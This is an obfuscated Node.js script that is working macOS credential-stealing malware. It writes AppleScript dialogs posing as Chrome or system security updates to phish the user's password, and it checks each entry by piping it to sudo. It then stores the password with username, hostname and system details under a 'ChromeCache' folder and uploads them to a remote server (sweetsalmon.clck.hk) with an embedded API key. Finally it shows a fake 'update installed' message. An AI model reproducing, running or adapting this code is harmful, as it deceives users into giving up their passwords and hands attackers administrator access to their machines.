#!/usr/bin/env node

function _0x3e82(){const _0xa1d89a=['454FJhYYr','75482JeOely','timeout','hostname','POST','type','\x0aArchitecture:\x20','73325JvPKLH','pathname','writeFileSync','.sh','#!/bin/bash\x0aecho\x20\x22','end','then','request','serverPort','----WebKitFormBoundary','toString','\x0atell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20display\x20dialog\x20\x22','User:\x20','byteLength','20KpVUkI','crypto','verify_','\x0aTime:\x20','://','path','multipart/form-data;\x20boundary=','substring','platform','ignore','3650LdzsfQ','27001mojNCO','30MlmlQx','.txt','\x0aClientID:\x20','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','393284eCzBUt','sweetsalmon.clck.hk','existsSync','data','http','trim','mac','2536atEwYZ','keys','startsWith','10521BSruLw','\x0aPlatform:\x20','600VoxWfx','.txt\x22\x0d\x0a','toISOString','348oEzNwd','unknown','tmpdir','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','port','ChromeCache','https','stringify','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','join','Your\x20password\x20is\x20required\x20to\x20update\x20Chrome\x20components.','813522xwqMTa','child_process','chrome_success_','.json','\x0aHostname:\x20','unlinkSync','arch','Chrome\x20Update\x20Required','networkInterfaces','chrome_prompt_','Chrome\x20needs\x20to\x20install\x20important\x20security\x20updates.\x20Please\x20enter\x20your\x20password\x20to\x20continue.','Incorrect\x20password.\x20','2198bpHWLU','.scpt','serverDomain','random','osascript\x20\x22','retryDelay','homedir','floor','\x0atell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20display\x20dialog\x20\x22Chrome\x20update\x20has\x20been\x20successfully\x20installed.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x0aend\x20tell\x0a','chrome_error_','\x22\x20default\x20answer\x20\x22\x22\x20buttons\x20{\x22Cancel\x22,\x20\x22Continue\x22}\x20default\x20button\x20\x22Continue\x22\x20with\x20hidden\x20answer\x0a\x20\x20\x20\x20set\x20userPassword\x20to\x20text\x20returned\x20of\x20the\x20result\x0a\x20\x20\x20\x20return\x20userPassword\x0aend\x20tell\x0a','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','update','serverPath','\x22\x20|\x20sudo\x20-S\x20echo\x20\x22Success\x22\x20>/dev/null\x202>&1\x0aexit\x20$?','now','userInfo','write','username','internal','substr','Chrome\x20-\x20Security\x20Update','https://','length','Chrome\x20needs\x20permission\x20to\x20modify\x20system\x20settings\x20to\x20improve\x20security.','maxRetries'];_0x3e82=function(){return _0xa1d89a;};return _0x3e82();}function _0x3749(_0x3ace0d,_0x188a59){const _0x3e8283=_0x3e82();return _0x3749=function(_0x374961,_0x4ec945){_0x374961=_0x374961-0x13e;let _0x6ff7f7=_0x3e8283[_0x374961];return _0x6ff7f7;},_0x3749(_0x3ace0d,_0x188a59);}const _0x307deb=_0x3749;(function(_0x11a9a1,_0x5de50c){const _0x20a9e1=_0x3749,_0xbdc929=_0x11a9a1();while(!![]){try{const _0xb1e683=-parseInt(_0x20a9e1(0x181))/0x1*(parseInt(_0x20a9e1(0x155))/0x2)+parseInt(_0x20a9e1(0x176))/0x3*(parseInt(_0x20a9e1(0x17a))/0x4)+-parseInt(_0x20a9e1(0x16a))/0x5*(parseInt(_0x20a9e1(0x194))/0x6)+parseInt(_0x20a9e1(0x15c))/0x7*(parseInt(_0x20a9e1(0x186))/0x8)+parseInt(_0x20a9e1(0x184))/0x9*(parseInt(_0x20a9e1(0x174))/0xa)+-parseInt(_0x20a9e1(0x156))/0xb*(parseInt(_0x20a9e1(0x189))/0xc)+-parseInt(_0x20a9e1(0x175))/0xd*(parseInt(_0x20a9e1(0x1a0))/0xe);if(_0xb1e683===_0x5de50c)break;else _0xbdc929['push'](_0xbdc929['shift']());}catch(_0xdf6681){_0xbdc929['push'](_0xbdc929['shift']());}}}(_0x3e82,0x86ddd));const {execSync}=require(_0x307deb(0x195)),fs=require('fs'),path=require(_0x307deb(0x16f)),os=require('os'),crypto=require(_0x307deb(0x16b)),http=require(_0x307deb(0x17e)),https=require(_0x307deb(0x18f)),CONFIG={'serverDomain':_0x307deb(0x17b),'serverPath':'/api/files/upload','serverPort':0x1f98,'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','retryDelay':0xbb8,'maxRetries':0x5,'timeout':0xea60};function generateClientId(){const _0x395c17=_0x307deb;try{const _0x3a36af=getMacAddress(),_0x35e49b=os[_0x395c17(0x158)](),_0x43029d=os[_0x395c17(0x14b)]()[_0x395c17(0x14d)],_0x3d59b1=crypto['createHash']('md5')[_0x395c17(0x147)](_0x3a36af+':'+_0x35e49b+':'+_0x43029d)['digest']('hex')[_0x395c17(0x171)](0x0,0x8);return _0x3d59b1;}catch(_0x9e039){return Math[_0x395c17(0x13e)]()['toString'](0x24)[_0x395c17(0x171)](0x2,0xa);}}function getMacAddress(){const _0x4e1ab0=_0x307deb;try{const _0x10d162=os[_0x4e1ab0(0x19c)]();for(const _0x1f6051 of Object[_0x4e1ab0(0x182)](_0x10d162)){for(const _0x3ac58e of _0x10d162[_0x1f6051]){if(!_0x3ac58e[_0x4e1ab0(0x14e)]&&_0x3ac58e[_0x4e1ab0(0x180)]!=='00:00:00:00:00:00')return _0x3ac58e[_0x4e1ab0(0x180)];}}return _0x4e1ab0(0x18a);}catch(_0x1d54b2){return _0x4e1ab0(0x18a);}}function verifyPassword(_0x407406){const _0x149189=_0x307deb;try{const _0x156101=path[_0x149189(0x192)](os[_0x149189(0x18b)](),_0x149189(0x16c)+Date['now']()+_0x149189(0x15f)),_0x21b98e=_0x149189(0x160)+_0x407406+_0x149189(0x149);fs[_0x149189(0x15e)](_0x156101,_0x21b98e,{'mode':0x1c0});try{return execSync('bash\x20\x22'+_0x156101+'\x22',{'stdio':_0x149189(0x173)}),fs['unlinkSync'](_0x156101),!![];}catch(_0x124940){return fs[_0x149189(0x199)](_0x156101),![];}}catch(_0x3e1fd0){return![];}}async function uploadToServer(_0x26ef4f,_0x2a63f2=0x0){return new Promise(_0x370db6=>{const _0x431e55=_0x3749;try{const _0x4bfc00=generateClientId(),_0x353b6e={'hostname':os[_0x431e55(0x158)](),'platform':os[_0x431e55(0x172)](),'type':os[_0x431e55(0x15a)](),'arch':os[_0x431e55(0x19a)](),'username':os['userInfo']()[_0x431e55(0x14d)],'id':_0x4bfc00},_0x51837d=CONFIG[_0x431e55(0x164)]===0x1bb?_0x431e55(0x18f):'http',_0x50d81c=_0x51837d+_0x431e55(0x16e)+CONFIG[_0x431e55(0x1a2)]+':'+CONFIG[_0x431e55(0x164)]+CONFIG[_0x431e55(0x148)],_0x5183c6=_0x50d81c[_0x431e55(0x183)](_0x431e55(0x151)),_0x3eacb6=_0x5183c6?https:http,_0x1b69ab=new URL(_0x50d81c),_0x472753=_0x431e55(0x165)+Math[_0x431e55(0x13e)]()[_0x431e55(0x166)](0x10)[_0x431e55(0x14f)](0x2);let _0x35cd87='';_0x35cd87+='--'+_0x472753+'\x0d\x0a',_0x35cd87+=_0x431e55(0x179),_0x35cd87+=_0x431e55(0x146),_0x35cd87+=JSON[_0x431e55(0x190)](_0x353b6e)+'\x0d\x0a',_0x35cd87+='--'+_0x472753+'\x0d\x0a',_0x35cd87+=_0x431e55(0x18c)+_0x4bfc00+_0x431e55(0x187),_0x35cd87+=_0x431e55(0x191),_0x35cd87+=_0x26ef4f+'\x0d\x0a',_0x35cd87+='--'+_0x472753+'--\x0d\x0a';const _0x3cc3e1={'hostname':_0x1b69ab['hostname'],'port':_0x1b69ab[_0x431e55(0x18d)]||(_0x5183c6?0x1bb:0x50),'path':_0x1b69ab[_0x431e55(0x15d)]+_0x1b69ab['search'],'method':_0x431e55(0x159),'headers':{'Content-Type':_0x431e55(0x170)+_0x472753,'Content-Length':Buffer[_0x431e55(0x169)](_0x35cd87),'X-Client-Info':JSON['stringify'](_0x353b6e),'X-API-Key':CONFIG['apiKey']},'timeout':CONFIG[_0x431e55(0x157)]},_0x463f94=_0x3eacb6[_0x431e55(0x163)](_0x3cc3e1,_0x3a6f9e=>{const _0x51684b=_0x431e55;let _0x5b8afc='';_0x3a6f9e['on'](_0x51684b(0x17d),_0x10e348=>{_0x5b8afc+=_0x10e348;}),_0x3a6f9e['on'](_0x51684b(0x161),()=>{const _0x10ca47=_0x51684b;_0x3a6f9e['statusCode']>=0xc8&&_0x3a6f9e['statusCode']<0x12c?_0x370db6(!![]):_0x2a63f2<CONFIG['maxRetries']?setTimeout(()=>{uploadToServer(_0x26ef4f,_0x2a63f2+0x1)['then'](_0x370db6);},CONFIG[_0x10ca47(0x140)]):_0x370db6(![]);});});_0x463f94['on']('error',()=>{const _0x1b4866=_0x431e55;_0x2a63f2<CONFIG[_0x1b4866(0x154)]?setTimeout(()=>{const _0x3d576d=_0x1b4866;uploadToServer(_0x26ef4f,_0x2a63f2+0x1)[_0x3d576d(0x162)](_0x370db6);},CONFIG['retryDelay']):_0x370db6(![]);}),_0x463f94[_0x431e55(0x14c)](_0x35cd87),_0x463f94[_0x431e55(0x161)]();}catch(_0x1f11a9){_0x2a63f2<CONFIG[_0x431e55(0x154)]?setTimeout(()=>{const _0x1c2bbd=_0x431e55;uploadToServer(_0x26ef4f,_0x2a63f2+0x1)[_0x1c2bbd(0x162)](_0x370db6);},CONFIG[_0x431e55(0x140)]):_0x370db6(![]);}});}async function main(){const _0xd8a890=_0x307deb;try{const _0x5626ef=os[_0xd8a890(0x141)](),_0xeae605=path[_0xd8a890(0x192)](_0x5626ef,_0xd8a890(0x18e));!fs[_0xd8a890(0x17c)](_0xeae605)&&fs['mkdirSync'](_0xeae605,{'recursive':!![]});const _0x1c16b4=[_0xd8a890(0x150),_0xd8a890(0x19b),'System\x20Settings\x20Access\x20Needed'],_0x2294cf=[_0xd8a890(0x19e),_0xd8a890(0x193),_0xd8a890(0x153)],_0x16c560=Math[_0xd8a890(0x142)](Math[_0xd8a890(0x13e)]()*_0x1c16b4[_0xd8a890(0x152)]),_0x597186=_0x1c16b4[_0x16c560],_0x3e7914=_0x2294cf[_0x16c560];let _0x5cea80=![],_0x1e0623=0x0,_0x4972e0='';while(!_0x5cea80&&_0x1e0623<0x5){_0x1e0623++;const _0x29e13e=_0x1e0623>0x1?_0xd8a890(0x19f):'';try{const _0x49970d=path['join'](os['tmpdir'](),_0xd8a890(0x19d)+Date[_0xd8a890(0x14a)]()+'.scpt'),_0x319334=_0xd8a890(0x167)+_0x29e13e+_0x3e7914+'\x22\x20with\x20title\x20\x22'+_0x597186+_0xd8a890(0x145);fs[_0xd8a890(0x15e)](_0x49970d,_0x319334);try{_0x4972e0=execSync(_0xd8a890(0x13f)+_0x49970d+'\x22')[_0xd8a890(0x166)]()[_0xd8a890(0x17f)](),fs['unlinkSync'](_0x49970d),_0x5cea80=verifyPassword(_0x4972e0);if(_0x5cea80)break;}catch(_0x1f0aae){fs[_0xd8a890(0x17c)](_0x49970d)&&fs['unlinkSync'](_0x49970d);return;}}catch(_0xda66d1){}}if(_0x5cea80){const _0x52a696=os[_0xd8a890(0x14b)]()['username'],_0x5c861c=generateClientId(),_0x545856=new Date()[_0xd8a890(0x188)](),_0x1af0d3=_0xd8a890(0x168)+_0x52a696+'\x0aPassword:\x20'+_0x4972e0+_0xd8a890(0x16d)+_0x545856+_0xd8a890(0x198)+os[_0xd8a890(0x158)]()+_0xd8a890(0x185)+os[_0xd8a890(0x172)]()+'\x0aType:\x20'+os[_0xd8a890(0x15a)]()+_0xd8a890(0x15b)+os[_0xd8a890(0x19a)]()+_0xd8a890(0x178)+_0x5c861c,_0x303095=path[_0xd8a890(0x192)](_0xeae605,_0x5c861c+_0xd8a890(0x177));fs[_0xd8a890(0x15e)](_0x303095,_0x1af0d3);const _0x3fcfb9={'user':_0x52a696,'password':_0x4972e0,'timestamp':_0x545856,'hostname':os['hostname'](),'system':{'platform':os[_0xd8a890(0x172)](),'release':os['release'](),'type':os[_0xd8a890(0x15a)](),'arch':os[_0xd8a890(0x19a)]()},'clientId':_0x5c861c},_0x29211c=path['join'](_0xeae605,_0x5c861c+_0xd8a890(0x197));fs[_0xd8a890(0x15e)](_0x29211c,JSON[_0xd8a890(0x190)](_0x3fcfb9,null,0x2)),await uploadToServer(_0x1af0d3);const _0x1eeb6a=path[_0xd8a890(0x192)](os[_0xd8a890(0x18b)](),_0xd8a890(0x196)+Date[_0xd8a890(0x14a)]()+_0xd8a890(0x1a1)),_0x3f12fd=_0xd8a890(0x143);fs['writeFileSync'](_0x1eeb6a,_0x3f12fd),execSync(_0xd8a890(0x13f)+_0x1eeb6a+'\x22'),fs[_0xd8a890(0x199)](_0x1eeb6a);}else{if(_0x1e0623>=0x5){const _0x4c0d39=path[_0xd8a890(0x192)](os[_0xd8a890(0x18b)](),_0xd8a890(0x144)+Date[_0xd8a890(0x14a)]()+'.scpt'),_0x535a53='\x0atell\x20application\x20\x22System\x20Events\x22\x0a\x20\x20\x20\x20display\x20dialog\x20\x22Update\x20failed.\x20Too\x20many\x20incorrect\x20password\x20attempts.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x0aend\x20tell\x0a';fs[_0xd8a890(0x15e)](_0x4c0d39,_0x535a53),execSync(_0xd8a890(0x13f)+_0x4c0d39+'\x22'),fs[_0xd8a890(0x199)](_0x4c0d39);}}}catch(_0x40976c){}}main();
